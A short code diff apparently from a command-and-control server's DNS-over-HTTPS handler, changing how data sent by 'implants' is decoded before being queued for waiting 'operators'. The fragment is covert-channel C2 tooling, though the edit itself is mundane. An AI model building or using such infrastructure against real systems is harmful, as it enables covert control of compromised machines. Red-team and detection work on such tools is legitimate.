@@ -595,7 +595,7 @@ def doh_handler():
         # print(ipv6_encoder.ipv6_to_string(decoded_list))
         logger.info(f"{transaction_id} sending us data")
         # Get the data
-        result = ipv6_encoder.ipv6_to_string(decoded_list)
+        result = ' '.join(decoded_list)
         # Check which operator is waiting for a result
         queue = implant_checkout[str(transaction_id)]
         operator = queue.get()
